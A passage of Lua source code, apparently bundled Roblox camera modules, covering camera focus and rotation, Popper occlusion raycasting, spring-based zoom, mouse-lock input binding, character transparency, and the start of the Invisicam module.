			newFocus = CFrame.new(Vector3.new(subjectPosition.x, math.min(self.humanoidJumpOrigin.y, lastFocus.y + 5 * timeDelta), subjectPosition.z))
		else
			newFocus = CFrame.new(Vector3.new(subjectPosition.x, lastFocus.y, subjectPosition.z):lerp(subjectPosition, self.cameraTranslationConstraints.y))
		end
	
		if self.cameraFrozen then
			-- No longer in 3rd person
			if self.inFirstPerson then -- not VRService.VREnabled
				self:CancelCameraFreeze()
			end
			-- This case you jumped off a cliff and want to keep your character in view
			-- 0.5 is to fix floating point error when not jumping off cliffs
			if self.humanoidJumpOrigin and subjectPosition.y < (self.humanoidJumpOrigin.y - 0.5) then
				self:CancelCameraFreeze()
			end
		end
	
		return newFocus
	end
	
	function BaseCamera:GetRotateAmountValue(vrRotationIntensity)
		vrRotationIntensity = vrRotationIntensity or StarterGui:GetCore("VRRotationIntensity")
		if vrRotationIntensity then
			if vrRotationIntensity == "Low" then
				return VR_LOW_INTENSITY_ROTATION
			elseif vrRotationIntensity == "High" then
				return VR_HIGH_INTENSITY_ROTATION
			end
		end
		return ZERO_VECTOR2
	end
	
	function BaseCamera:GetRepeatDelayValue(vrRotationIntensity)
		vrRotationIntensity = vrRotationIntensity or StarterGui:GetCore("VRRotationIntensity")
		if vrRotationIntensity then
			if vrRotationIntensity == "Low" then
				return VR_LOW_INTENSITY_REPEAT
			elseif vrRotationIntensity == "High" then
				return VR_HIGH_INTENSITY_REPEAT
			end
		end
		return 0
	end
	
	function BaseCamera:Update(dt)
		error("BaseCamera:Update() This is a virtual function that should never be getting called.", 2)
	end
	
	BaseCamera.UpCFrame = CFrame.new()
	
	function BaseCamera:UpdateUpCFrame(cf)
		self.UpCFrame = cf
	end
	local ZERO = Vector3.new(0, 0, 0)
	function BaseCamera:CalculateNewLookCFrame(suppliedLookVector)
		local currLookVector = suppliedLookVector or self:GetCameraLookVector()
		currLookVector = self.UpCFrame:VectorToObjectSpace(currLookVector)
		
		local currPitchAngle = math.asin(currLookVector.y)
		local yTheta = math.clamp(self.rotateInput.y, -MAX_Y + currPitchAngle, -MIN_Y + currPitchAngle)
		local constrainedRotateInput = Vector2.new(self.rotateInput.x, yTheta)
		local startCFrame = CFrame.new(ZERO, currLookVector)
		local newLookCFrame = CFrame.Angles(0, -constrainedRotateInput.x, 0) * startCFrame * CFrame.Angles(-constrainedRotateInput.y,0,0)
		
		return newLookCFrame
	end
	
	return BaseCamera
end

function _BaseOcclusion()
	--[[ The Module ]]--
	local BaseOcclusion = {}
	BaseOcclusion.__index = BaseOcclusion
	setmetatable(BaseOcclusion, {
		__call = function(_, ...)
			return BaseOcclusion.new(...)
		end
	})
	
	function BaseOcclusion.new()
		local self = setmetatable({}, BaseOcclusion)
		return self
	end
	
	-- Called when character is added
	function BaseOcclusion:CharacterAdded(char, player)
	end
	
	-- Called when character is about to be removed
	function BaseOcclusion:CharacterRemoving(char, player)
	end
	
	function BaseOcclusion:OnCameraSubjectChanged(newSubject)
	end
	
	--[[ Derived classes are required to override and implement all of the following functions ]]--
	function BaseOcclusion:GetOcclusionMode()
		-- Must be overridden in derived classes to return an Enum.DevCameraOcclusionMode value
		warn("BaseOcclusion GetOcclusionMode must be overridden by derived classes")
		return nil
	end
	
	function BaseOcclusion:Enable(enabled)
		warn("BaseOcclusion Enable must be overridden by derived classes")
	end
	
	function BaseOcclusion:Update(dt, desiredCameraCFrame, desiredCameraFocus)
		warn("BaseOcclusion Update must be overridden by derived classes")
		return desiredCameraCFrame, desiredCameraFocus
	end
	
	return BaseOcclusion
end

function _Popper()
	
	local Players = game:GetService("Players")
	
	local camera = game.Workspace.CurrentCamera
	
	local min = math.min
	local tan = math.tan
	local rad = math.rad
	local inf = math.huge
	local ray = Ray.new
	
	local function getTotalTransparency(part)
		return 1 - (1 - part.Transparency)*(1 - part.LocalTransparencyModifier)
	end
	
	local function eraseFromEnd(t, toSize)
		for i = #t, toSize + 1, -1 do
			t[i] = nil
		end
	end
	
	local nearPlaneZ, projX, projY do
		local function updateProjection()
			local fov = rad(camera.FieldOfView)
			local view = camera.ViewportSize
			local ar = view.X/view.Y
	
			projY = 2*tan(fov/2)
			projX = ar*projY
		end
	
		camera:GetPropertyChangedSignal("FieldOfView"):Connect(updateProjection)
		camera:GetPropertyChangedSignal("ViewportSize"):Connect(updateProjection)
	
		updateProjection()
	
		nearPlaneZ = camera.NearPlaneZ
		camera:GetPropertyChangedSignal("NearPlaneZ"):Connect(function()
			nearPlaneZ = camera.NearPlaneZ
		end)
	end
	
	local blacklist = {} do
		local charMap = {}
	
		local function refreshIgnoreList()
			local n = 1
			blacklist = {}
			for _, character in pairs(charMap) do
				blacklist[n] = character
				n = n + 1
			end
		end
	
		local function playerAdded(player)
			local function characterAdded(character)
				charMap[player] = character
				refreshIgnoreList()
			end
			local function characterRemoving()
				charMap[player] = nil
				refreshIgnoreList()
			end
	
			player.CharacterAdded:Connect(characterAdded)
			player.CharacterRemoving:Connect(characterRemoving)
			if player.Character then
				characterAdded(player.Character)
			end
		end
	
		local function playerRemoving(player)
			charMap[player] = nil
			refreshIgnoreList()
		end
	
		Players.PlayerAdded:Connect(playerAdded)
		Players.PlayerRemoving:Connect(playerRemoving)
	
		for _, player in ipairs(Players:GetPlayers()) do
			playerAdded(player)
		end
		refreshIgnoreList()
	end
	
	--------------------------------------------------------------------------------------------
	-- Popper uses the level geometry find an upper bound on subject-to-camera distance.
	--
	-- Hard limits are applied immediately and unconditionally. They are generally caused
	-- when level geometry intersects with the near plane (with exceptions, see below).
	--
	-- Soft limits are only applied under certain conditions.
	-- They are caused when level geometry occludes the subject without actually intersecting
	-- with the near plane at the target distance.
	--
	-- Soft limits can be promoted to hard limits and hard limits can be demoted to soft limits.
	-- We usually don"t want the latter to happen.
	--
	-- A soft limit will be promoted to a hard limit if an obstruction
	-- lies between the current and target camera positions.
	--------------------------------------------------------------------------------------------
	
	local subjectRoot
	local subjectPart
	
	camera:GetPropertyChangedSignal("CameraSubject"):Connect(function()
		local subject = camera.CameraSubject
		if subject:IsA("Humanoid") then
			subjectPart = subject.RootPart
		elseif subject:IsA("BasePart") then
			subjectPart = subject
		else
			subjectPart = nil
		end
	end)
	
	local function canOcclude(part)
		-- Occluders must be:
		-- 1. Opaque
		-- 2. Interactable
		-- 3. Not in the same assembly as the subject
	
		return
			getTotalTransparency(part) < 0.25 and
			part.CanCollide and
			subjectRoot ~= (part:GetRootPart() or part) and
			not part:IsA("TrussPart")
	end
	
	-- Offsets for the volume visibility test
	local SCAN_SAMPLE_OFFSETS = {
		Vector2.new( 0.4, 0.0),
		Vector2.new(-0.4, 0.0),
		Vector2.new( 0.0,-0.4),
		Vector2.new( 0.0, 0.4),
		Vector2.new( 0.0, 0.2),
	}
	
	--------------------------------------------------------------------------------
	-- Piercing raycasts
	
	local function getCollisionPoint(origin, dir)
		local originalSize = #blacklist
		repeat
			local hitPart, hitPoint = workspace:FindPartOnRayWithIgnoreList(
				ray(origin, dir), blacklist, false, true
			)
	
			if hitPart then
				if hitPart.CanCollide then
					eraseFromEnd(blacklist, originalSize)
					return hitPoint, true
				end
				blacklist[#blacklist + 1] = hitPart
			end
		until not hitPart
	
		eraseFromEnd(blacklist, originalSize)
		return origin + dir, false
	end
	
	--------------------------------------------------------------------------------
	
	local function queryPoint(origin, unitDir, dist, lastPos)
		debug.profilebegin("queryPoint")
	
		local originalSize = #blacklist
	
		dist = dist + nearPlaneZ
		local target = origin + unitDir*dist
	
		local softLimit = inf
		local hardLimit = inf
		local movingOrigin = origin
	
		repeat
			local entryPart, entryPos = workspace:FindPartOnRayWithIgnoreList(ray(movingOrigin, target - movingOrigin), blacklist, false, true)
	
			if entryPart then
				if canOcclude(entryPart) then
					local wl = {entryPart}
					local exitPart = workspace:FindPartOnRayWithWhitelist(ray(target, entryPos - target), wl, true)
	
					local lim = (entryPos - origin).Magnitude
	
					if exitPart then
						local promote = false
						if lastPos then
							promote =
								workspace:FindPartOnRayWithWhitelist(ray(lastPos, target - lastPos), wl, true) or
								workspace:FindPartOnRayWithWhitelist(ray(target, lastPos - target), wl, true)
						end
	
						if promote then
							-- Ostensibly a soft limit, but the camera has passed through it in the last frame, so promote to a hard limit.
							hardLimit = lim
						elseif dist < softLimit then
							-- Trivial soft limit
							softLimit = lim
						end
					else
						-- Trivial hard limit
						hardLimit = lim
					end
				end
	
				blacklist[#blacklist + 1] = entryPart
				movingOrigin = entryPos - unitDir*1e-3
			end
		until hardLimit < inf or not entryPart
	
		eraseFromEnd(blacklist, originalSize)
	
		debug.profileend()
		return softLimit - nearPlaneZ, hardLimit - nearPlaneZ
	end
	
	local function queryViewport(focus, dist)
		debug.profilebegin("queryViewport")
	
		local fP =  focus.p
		local fX =  focus.rightVector
		local fY =  focus.upVector
		local fZ = -focus.lookVector
	
		local viewport = camera.ViewportSize
	
		local hardBoxLimit = inf
		local softBoxLimit = inf
	
		-- Center the viewport on the PoI, sweep points on the edge towards the target, and take the minimum limits
		for viewX = 0, 1 do
			local worldX = fX*((viewX - 0.5)*projX)
	
			for viewY = 0, 1 do
				local worldY = fY*((viewY - 0.5)*projY)
	
				local origin = fP + nearPlaneZ*(worldX + worldY)
				local lastPos = camera:ViewportPointToRay(
					viewport.x*viewX,
					viewport.y*viewY
				).Origin
	
				local softPointLimit, hardPointLimit = queryPoint(origin, fZ, dist, lastPos)
	
				if hardPointLimit < hardBoxLimit then
					hardBoxLimit = hardPointLimit
				end
				if softPointLimit < softBoxLimit then
					softBoxLimit = softPointLimit
				end
			end
		end
		debug.profileend()
	
		return softBoxLimit, hardBoxLimit
	end
	
	local function testPromotion(focus, dist, focusExtrapolation)
		debug.profilebegin("testPromotion")
	
		local fP = focus.p
		local fX = focus.rightVector
		local fY = focus.upVector
		local fZ = -focus.lookVector
	
		do
			-- Dead reckoning the camera rotation and focus
			debug.profilebegin("extrapolate")
	
			local SAMPLE_DT = 0.0625
			local SAMPLE_MAX_T = 1.25
	
			local maxDist = (getCollisionPoint(fP, focusExtrapolation.posVelocity*SAMPLE_MAX_T) - fP).Magnitude
			-- Metric that decides how many samples to take
			local combinedSpeed = focusExtrapolation.posVelocity.magnitude
	
			for dt = 0, min(SAMPLE_MAX_T, focusExtrapolation.rotVelocity.magnitude + maxDist/combinedSpeed), SAMPLE_DT do
				local cfDt = focusExtrapolation.extrapolate(dt) -- Extrapolated CFrame at time dt
	
				if queryPoint(cfDt.p, -cfDt.lookVector, dist) >= dist then
					return false
				end
			end
	
			debug.profileend()
		end
	
		do
			-- Test screen-space offsets from the focus for the presence of soft limits
			debug.profilebegin("testOffsets")
	
			for _, offset in ipairs(SCAN_SAMPLE_OFFSETS) do
				local scaledOffset = offset
				local pos = getCollisionPoint(fP, fX*scaledOffset.x + fY*scaledOffset.y)
				if queryPoint(pos, (fP + fZ*dist - pos).Unit, dist) == inf then
					return false
				end
			end
	
			debug.profileend()
		end
	
		debug.profileend()
		return true
	end
	
	local function Popper(focus, targetDist, focusExtrapolation)
		debug.profilebegin("popper")
	
		subjectRoot = subjectPart and subjectPart:GetRootPart() or subjectPart
	
		local dist = targetDist
		local soft, hard = queryViewport(focus, targetDist)
		if hard < dist then
			dist = hard
		end
		if soft < dist and testPromotion(focus, targetDist, focusExtrapolation) then
			dist = soft
		end
	
		subjectRoot = nil
	
		debug.profileend()
		return dist
	end
	
	return Popper
end

function _ZoomController()
	local ZOOM_STIFFNESS = 4.5
	local ZOOM_DEFAULT = 12.5
	local ZOOM_ACCELERATION = 0.0375
	
	local MIN_FOCUS_DIST = 0.5
	local DIST_OPAQUE = 1
	
	local Popper = _Popper()
	
	local clamp = math.clamp
	local exp = math.exp
	local min = math.min
	local max = math.max
	local pi = math.pi
	
	local cameraMinZoomDistance, cameraMaxZoomDistance do
		local Player = game:GetService("Players").LocalPlayer
	
		local function updateBounds()
			cameraMinZoomDistance = Player.CameraMinZoomDistance
			cameraMaxZoomDistance = Player.CameraMaxZoomDistance
		end
	
		updateBounds()
	
		Player:GetPropertyChangedSignal("CameraMinZoomDistance"):Connect(updateBounds)
		Player:GetPropertyChangedSignal("CameraMaxZoomDistance"):Connect(updateBounds)
	end
	
	local ConstrainedSpring = {} do
		ConstrainedSpring.__index = ConstrainedSpring
	
		function ConstrainedSpring.new(freq, x, minValue, maxValue)
			x = clamp(x, minValue, maxValue)
			return setmetatable({
				freq = freq, -- Undamped frequency (Hz)
				x = x, -- Current position
				v = 0, -- Current velocity
				minValue = minValue, -- Minimum bound
				maxValue = maxValue, -- Maximum bound
				goal = x, -- Goal position
			}, ConstrainedSpring)
		end
	
		function ConstrainedSpring:Step(dt)
			local freq = self.freq*2*pi -- Convert from Hz to rad/s
			local x = self.x
			local v = self.v
			local minValue = self.minValue
			local maxValue = self.maxValue
			local goal = self.goal
	
			-- Solve the spring ODE for position and velocity after time t, assuming critical damping:
			--   2*f*x'[t] + x''[t] = f^2*(g - x[t])
			-- Knowns are x[0] and x'[0].
			-- Solve for x[t] and x'[t].
	
			local offset = goal - x
			local step = freq*dt
			local decay = exp(-step)
	
			local x1 = goal + (v*dt - offset*(step + 1))*decay
			local v1 = ((offset*freq - v)*step + v)*decay
	
			-- Constrain
			if x1 < minValue then
				x1 = minValue
				v1 = 0
			elseif x1 > maxValue then
				x1 = maxValue
				v1 = 0
			end
	
			self.x = x1
			self.v = v1
	
			return x1
		end
	end
	
	local zoomSpring = ConstrainedSpring.new(ZOOM_STIFFNESS, ZOOM_DEFAULT, MIN_FOCUS_DIST, cameraMaxZoomDistance)
	
	local function stepTargetZoom(z, dz, zoomMin, zoomMax)
		z = clamp(z + dz*(1 + z*ZOOM_ACCELERATION), zoomMin, zoomMax)
		if z < DIST_OPAQUE then
			z = dz <= 0 and zoomMin or DIST_OPAQUE
		end
		return z
	end
	
	local zoomDelta = 0
	
	local Zoom = {} do
		function Zoom.Update(renderDt, focus, extrapolation)
			local poppedZoom = math.huge
	
			if zoomSpring.goal > DIST_OPAQUE then
				-- Make a pessimistic estimate of zoom distance for this step without accounting for poppercam
				local maxPossibleZoom = max(
					zoomSpring.x,
					stepTargetZoom(zoomSpring.goal, zoomDelta, cameraMinZoomDistance, cameraMaxZoomDistance)
				)
	
				-- Run the Popper algorithm on the feasible zoom range, [MIN_FOCUS_DIST, maxPossibleZoom]
				poppedZoom = Popper(
					focus*CFrame.new(0, 0, MIN_FOCUS_DIST),
					maxPossibleZoom - MIN_FOCUS_DIST,
					extrapolation
				) + MIN_FOCUS_DIST
			end
	
			zoomSpring.minValue = MIN_FOCUS_DIST
			zoomSpring.maxValue = min(cameraMaxZoomDistance, poppedZoom)
	
			return zoomSpring:Step(renderDt)
		end
	
		function Zoom.SetZoomParameters(targetZoom, newZoomDelta)
			zoomSpring.goal = targetZoom
			zoomDelta = newZoomDelta
		end
	end
	
	return Zoom
end

function _MouseLockController()
	--[[ Constants ]]--
	local DEFAULT_MOUSE_LOCK_CURSOR = "rbxasset://textures/MouseLockedCursor.png"
	
	local CONTEXT_ACTION_NAME = "MouseLockSwitchAction"
	local MOUSELOCK_ACTION_PRIORITY = Enum.ContextActionPriority.Default.Value
	
	--[[ Services ]]--
	local PlayersService = game:GetService("Players")
	local ContextActionService = game:GetService("ContextActionService")
	local Settings = UserSettings()	-- ignore warning
	local GameSettings = Settings.GameSettings
	local Mouse = PlayersService.LocalPlayer:GetMouse()
	
	--[[ The Module ]]--
	local MouseLockController = {}
	MouseLockController.__index = MouseLockController
	
	function MouseLockController.new()
		local self = setmetatable({}, MouseLockController)
	
		self.isMouseLocked = false
		self.savedMouseCursor = nil
		self.boundKeys = {Enum.KeyCode.LeftShift, Enum.KeyCode.RightShift} -- defaults
	
		self.mouseLockToggledEvent = Instance.new("BindableEvent")
	
		local boundKeysObj = script:FindFirstChild("BoundKeys")
		if (not boundKeysObj) or (not boundKeysObj:IsA("StringValue")) then
			-- If object with correct name was found, but it's not a StringValue, destroy and replace
			if boundKeysObj then
				boundKeysObj:Destroy()
			end
	
			boundKeysObj = Instance.new("StringValue")
			boundKeysObj.Name = "BoundKeys"
			boundKeysObj.Value = "LeftShift,RightShift"
			boundKeysObj.Parent = script
		end
	
		if boundKeysObj then
			boundKeysObj.Changed:Connect(function(value)
				self:OnBoundKeysObjectChanged(value)
			end)
			self:OnBoundKeysObjectChanged(boundKeysObj.Value) -- Initial setup call
		end
	
		-- Watch for changes to user's ControlMode and ComputerMovementMode settings and update the feature availability accordingly
		GameSettings.Changed:Connect(function(property)
			if property == "ControlMode" or property == "ComputerMovementMode" then
				self:UpdateMouseLockAvailability()
			end
		end)
	
		-- Watch for changes to DevEnableMouseLock and update the feature availability accordingly
		PlayersService.LocalPlayer:GetPropertyChangedSignal("DevEnableMouseLock"):Connect(function()
			self:UpdateMouseLockAvailability()
		end)
	
		-- Watch for changes to DevEnableMouseLock and update the feature availability accordingly
		PlayersService.LocalPlayer:GetPropertyChangedSignal("DevComputerMovementMode"):Connect(function()
			self:UpdateMouseLockAvailability()
		end)
	
		self:UpdateMouseLockAvailability()
	
		return self
	end
	
	function MouseLockController:GetIsMouseLocked()
		return self.isMouseLocked
	end
	
	function MouseLockController:GetBindableToggleEvent()
		return self.mouseLockToggledEvent.Event
	end
	
	function MouseLockController:GetMouseLockOffset()
		local offsetValueObj = script:FindFirstChild("CameraOffset")
		if offsetValueObj and offsetValueObj:IsA("Vector3Value") then
			return offsetValueObj.Value
		else
			-- If CameraOffset object was found but not correct type, destroy
			if offsetValueObj then
				offsetValueObj:Destroy()
			end
			offsetValueObj = Instance.new("Vector3Value")
			offsetValueObj.Name = "CameraOffset"
			offsetValueObj.Value = Vector3.new(1.75,0,0) -- Legacy Default Value
			offsetValueObj.Parent = script
		end
	
		if offsetValueObj and offsetValueObj.Value then
			return offsetValueObj.Value
		end
	
		return Vector3.new(1.75,0,0)
	end
	
	function MouseLockController:UpdateMouseLockAvailability()
		local devAllowsMouseLock = PlayersService.LocalPlayer.DevEnableMouseLock
		local devMovementModeIsScriptable = PlayersService.LocalPlayer.DevComputerMovementMode == Enum.DevComputerMovementMode.Scriptable
		local userHasMouseLockModeEnabled = GameSettings.ControlMode == Enum.ControlMode.MouseLockSwitch
		local userHasClickToMoveEnabled =  GameSettings.ComputerMovementMode == Enum.ComputerMovementMode.ClickToMove
		local MouseLockAvailable = devAllowsMouseLock and userHasMouseLockModeEnabled and not userHasClickToMoveEnabled and not devMovementModeIsScriptable
	
		if MouseLockAvailable~=self.enabled then
			self:EnableMouseLock(MouseLockAvailable)
		end
	end
	
	function MouseLockController:OnBoundKeysObjectChanged(newValue)
		self.boundKeys = {} -- Overriding defaults, note: possibly with nothing at all if boundKeysObj.Value is "" or contains invalid values
		for token in string.gmatch(newValue,"[^%s,]+") do
			for _, keyEnum in pairs(Enum.KeyCode:GetEnumItems()) do
				if token == keyEnum.Name then
					self.boundKeys[#self.boundKeys+1] = keyEnum
					break
				end
			end
		end
		self:UnbindContextActions()
		self:BindContextActions()
	end
	
	--[[ Local Functions ]]--
	function MouseLockController:OnMouseLockToggled()
		self.isMouseLocked = not self.isMouseLocked
	
		if self.isMouseLocked then
			local cursorImageValueObj = script:FindFirstChild("CursorImage")
			if cursorImageValueObj and cursorImageValueObj:IsA("StringValue") and cursorImageValueObj.Value then
				self.savedMouseCursor = Mouse.Icon
				Mouse.Icon = cursorImageValueObj.Value
			else
				if cursorImageValueObj then
					cursorImageValueObj:Destroy()
				end
				cursorImageValueObj = Instance.new("StringValue")
				cursorImageValueObj.Name = "CursorImage"
				cursorImageValueObj.Value = DEFAULT_MOUSE_LOCK_CURSOR
				cursorImageValueObj.Parent = script
				self.savedMouseCursor = Mouse.Icon
				Mouse.Icon = DEFAULT_MOUSE_LOCK_CURSOR
			end
		else
			if self.savedMouseCursor then
				Mouse.Icon = self.savedMouseCursor
				self.savedMouseCursor = nil
			end
		end
	
		self.mouseLockToggledEvent:Fire()
	end
	
	function MouseLockController:DoMouseLockSwitch(name, state, input)
		if state == Enum.UserInputState.Begin then
			self:OnMouseLockToggled()
			return Enum.ContextActionResult.Sink
		end
		return Enum.ContextActionResult.Pass
	end
	
	function MouseLockController:BindContextActions()
		ContextActionService:BindActionAtPriority(CONTEXT_ACTION_NAME, function(name, state, input)
			return self:DoMouseLockSwitch(name, state, input)
		end, false, MOUSELOCK_ACTION_PRIORITY, unpack(self.boundKeys))
	end
	
	function MouseLockController:UnbindContextActions()
		ContextActionService:UnbindAction(CONTEXT_ACTION_NAME)
	end
	
	function MouseLockController:IsMouseLocked()
		return self.enabled and self.isMouseLocked
	end
	
	function MouseLockController:EnableMouseLock(enable)
		if enable ~= self.enabled then
	
			self.enabled = enable
	
			if self.enabled then
				-- Enabling the mode
				self:BindContextActions()
			else
				-- Disabling
				-- Restore mouse cursor
				if Mouse.Icon~="" then
					Mouse.Icon = ""
				end
	
				self:UnbindContextActions()
	
				-- If the mode is disabled while being used, fire the event to toggle it off
				if self.isMouseLocked then
					self.mouseLockToggledEvent:Fire()
				end
	
				self.isMouseLocked = false
			end
	
		end
	end
	
	return MouseLockController
end

function _TransparencyController()
	
	local MAX_TWEEN_RATE = 2.8 -- per second
	
	local Util = _CameraUtils()
	
	--[[ The Module ]]--
	local TransparencyController = {}
	TransparencyController.__index = TransparencyController
	
	function TransparencyController.new()
		local self = setmetatable({}, TransparencyController)
	
		self.lastUpdate = tick()
		self.transparencyDirty = false
		self.enabled = false
		self.lastTransparency = nil
	
		self.descendantAddedConn, self.descendantRemovingConn = nil, nil
		self.toolDescendantAddedConns = {}
		self.toolDescendantRemovingConns = {}
		self.cachedParts = {}
	
		return self
	end
	
	
	function TransparencyController:HasToolAncestor(object)
		if object.Parent == nil then return false end
		return object.Parent:IsA('Tool') or self:HasToolAncestor(object.Parent)
	end
	
	function TransparencyController:IsValidPartToModify(part)
		if part:IsA('BasePart') or part:IsA('Decal') then
			return not self:HasToolAncestor(part)
		end
		return false
	end
	
	function TransparencyController:CachePartsRecursive(object)
		if object then
			if self:IsValidPartToModify(object) then
				self.cachedParts[object] = true
				self.transparencyDirty = true
			end
			for _, child in pairs(object:GetChildren()) do
				self:CachePartsRecursive(child)
			end
		end
	end
	
	function TransparencyController:TeardownTransparency()
		for child, _ in pairs(self.cachedParts) do
			child.LocalTransparencyModifier = 0
		end
		self.cachedParts = {}
		self.transparencyDirty = true
		self.lastTransparency = nil
	
		if self.descendantAddedConn then
			self.descendantAddedConn:disconnect()
			self.descendantAddedConn = nil
		end
		if self.descendantRemovingConn then
			self.descendantRemovingConn:disconnect()
			self.descendantRemovingConn = nil
		end
		for object, conn in pairs(self.toolDescendantAddedConns) do
			conn:Disconnect()
			self.toolDescendantAddedConns[object] = nil
		end
		for object, conn in pairs(self.toolDescendantRemovingConns) do
			conn:Disconnect()
			self.toolDescendantRemovingConns[object] = nil
		end
	end
	
	function TransparencyController:SetupTransparency(character)
		self:TeardownTransparency()
	
		if self.descendantAddedConn then self.descendantAddedConn:disconnect() end
		self.descendantAddedConn = character.DescendantAdded:Connect(function(object)
			-- This is a part we want to invisify
			if self:IsValidPartToModify(object) then
				self.cachedParts[object] = true
				self.transparencyDirty = true
			-- There is now a tool under the character
			elseif object:IsA('Tool') then
				if self.toolDescendantAddedConns[object] then self.toolDescendantAddedConns[object]:Disconnect() end
				self.toolDescendantAddedConns[object] = object.DescendantAdded:Connect(function(toolChild)
					self.cachedParts[toolChild] = nil
					if toolChild:IsA('BasePart') or toolChild:IsA('Decal') then
						-- Reset the transparency
						toolChild.LocalTransparencyModifier = 0
					end
				end)
				if self.toolDescendantRemovingConns[object] then self.toolDescendantRemovingConns[object]:disconnect() end
				self.toolDescendantRemovingConns[object] = object.DescendantRemoving:Connect(function(formerToolChild)
					wait() -- wait for new parent
					if character and formerToolChild and formerToolChild:IsDescendantOf(character) then
						if self:IsValidPartToModify(formerToolChild) then
							self.cachedParts[formerToolChild] = true
							self.transparencyDirty = true
						end
					end
				end)
			end
		end)
		if self.descendantRemovingConn then self.descendantRemovingConn:disconnect() end
		self.descendantRemovingConn = character.DescendantRemoving:connect(function(object)
			if self.cachedParts[object] then
				self.cachedParts[object] = nil
				-- Reset the transparency
				object.LocalTransparencyModifier = 0
			end
		end)
		self:CachePartsRecursive(character)
	end
	
	
	function TransparencyController:Enable(enable)
		if self.enabled ~= enable then
			self.enabled = enable
			self:Update()
		end
	end
	
	function TransparencyController:SetSubject(subject)
		local character = nil
		if subject and subject:IsA("Humanoid") then
			character = subject.Parent
		end
		if subject and subject:IsA("VehicleSeat") and subject.Occupant then
			character = subject.Occupant.Parent
		end
		if character then
			self:SetupTransparency(character)
		else
			self:TeardownTransparency()
		end
	end
	
	function TransparencyController:Update()
		local instant = false
		local now = tick()
		local currentCamera = workspace.CurrentCamera
	
		if currentCamera then
			local transparency = 0
			if not self.enabled then
				instant = true
			else
				local distance = (currentCamera.Focus.p - currentCamera.CoordinateFrame.p).magnitude
				transparency = (distance<2) and (1.0-(distance-0.5)/1.5) or 0 --(7 - distance) / 5
				if transparency < 0.5 then
					transparency = 0
				end
	
				if self.lastTransparency then
					local deltaTransparency = transparency - self.lastTransparency
	
					-- Don't tween transparency if it is instant or your character was fully invisible last frame
					if not instant and transparency < 1 and self.lastTransparency < 0.95 then
						local maxDelta = MAX_TWEEN_RATE * (now - self.lastUpdate)
						deltaTransparency = math.clamp(deltaTransparency, -maxDelta, maxDelta)
					end
					transparency = self.lastTransparency + deltaTransparency
				else
					self.transparencyDirty = true
				end
	
				transparency = math.clamp(Util.Round(transparency, 2), 0, 1)
			end
	
			if self.transparencyDirty or self.lastTransparency ~= transparency then
				for child, _ in pairs(self.cachedParts) do
					child.LocalTransparencyModifier = transparency
				end
				self.transparencyDirty = false
				self.lastTransparency = transparency
			end
		end
		self.lastUpdate = now
	end
	
	return TransparencyController
end

function _Poppercam()
	local ZoomController =  _ZoomController()
	
	local TransformExtrapolator = {} do
		TransformExtrapolator.__index = TransformExtrapolator
	
		local CF_IDENTITY = CFrame.new()
	
		local function cframeToAxis(cframe)
			local axis, angle = cframe:toAxisAngle()
			return axis*angle
		end
	
		local function axisToCFrame(axis)
			local angle = axis.magnitude
			if angle > 1e-5 then
				return CFrame.fromAxisAngle(axis, angle)
			end
			return CF_IDENTITY
		end
	
		local function extractRotation(cf)
			local _, _, _, xx, yx, zx, xy, yy, zy, xz, yz, zz = cf:components()
			return CFrame.new(0, 0, 0, xx, yx, zx, xy, yy, zy, xz, yz, zz)
		end
	
		function TransformExtrapolator.new()
			return setmetatable({
				lastCFrame = nil,
			}, TransformExtrapolator)
		end
	
		function TransformExtrapolator:Step(dt, currentCFrame)
			local lastCFrame = self.lastCFrame or currentCFrame
			self.lastCFrame = currentCFrame
	
			local currentPos = currentCFrame.p
			local currentRot = extractRotation(currentCFrame)
	
			local lastPos = lastCFrame.p
			local lastRot = extractRotation(lastCFrame)
	
			-- Estimate velocities from the delta between now and the last frame
			-- This estimation can be a little noisy.
			local dp = (currentPos - lastPos)/dt
			local dr = cframeToAxis(currentRot*lastRot:inverse())/dt
	
			local function extrapolate(t)
				local p = dp*t + currentPos
				local r = axisToCFrame(dr*t)*currentRot
				return r + p
			end
	
			return {
				extrapolate = extrapolate,
				posVelocity = dp,
				rotVelocity = dr,
			}
		end
	
		function TransformExtrapolator:Reset()
			self.lastCFrame = nil
		end
	end
	
	--[[ The Module ]]--
	local BaseOcclusion = _BaseOcclusion()
	local Poppercam = setmetatable({}, BaseOcclusion)
	Poppercam.__index = Poppercam
	
	function Poppercam.new()
		local self = setmetatable(BaseOcclusion.new(), Poppercam)
		self.focusExtrapolator = TransformExtrapolator.new()
		return self
	end
	
	function Poppercam:GetOcclusionMode()
		return Enum.DevCameraOcclusionMode.Zoom
	end
	
	function Poppercam:Enable(enable)
		self.focusExtrapolator:Reset()
	end
	
	function Poppercam:Update(renderDt, desiredCameraCFrame, desiredCameraFocus, cameraController)
		local rotatedFocus = CFrame.new(desiredCameraFocus.p, desiredCameraCFrame.p)*CFrame.new(
			0, 0, 0,
			-1, 0, 0,
			0, 1, 0,
			0, 0, -1
		)
		local extrapolation = self.focusExtrapolator:Step(renderDt, rotatedFocus)
		local zoom = ZoomController.Update(renderDt, rotatedFocus, extrapolation)
		return rotatedFocus*CFrame.new(0, 0, zoom), desiredCameraFocus
	end
	
	-- Called when character is added
	function Poppercam:CharacterAdded(character, player)
	end
	
	-- Called when character is about to be removed
	function Poppercam:CharacterRemoving(character, player)
	end
	
	function Poppercam:OnCameraSubjectChanged(newSubject)
	end
	
	local ZoomController = _ZoomController()
	
	function Poppercam:Update(renderDt, desiredCameraCFrame, desiredCameraFocus, cameraController)
		local rotatedFocus = desiredCameraFocus * (desiredCameraCFrame - desiredCameraCFrame.p)
		local extrapolation = self.focusExtrapolator:Step(renderDt, rotatedFocus)
		local zoom = ZoomController.Update(renderDt, rotatedFocus, extrapolation)
		return rotatedFocus*CFrame.new(0, 0, zoom), desiredCameraFocus
	end
	
	return Poppercam
end

function _Invisicam()
	
	--[[ Top Level Roblox Services ]]--
	local PlayersService = game:GetService("Players")
	
	--[[ Constants ]]--
	local ZERO_VECTOR3 = Vector3.new(0,0,0)
	local USE_STACKING_TRANSPARENCY = true	-- Multiple items between the subject and camera get transparency values that add up to TARGET_TRANSPARENCY
	local TARGET_TRANSPARENCY = 0.75 -- Classic Invisicam's Value, also used by new invisicam for parts hit by head and torso rays
	local TARGET_TRANSPARENCY_PERIPHERAL = 0.5 -- Used by new SMART_CIRCLE mode for items not hit by head and torso rays
	
	local MODE = {
		--CUSTOM = 1, 		-- Retired, unused
		LIMBS = 2, 			-- Track limbs
		MOVEMENT = 3, 		-- Track movement
		CORNERS = 4, 		-- Char model corners
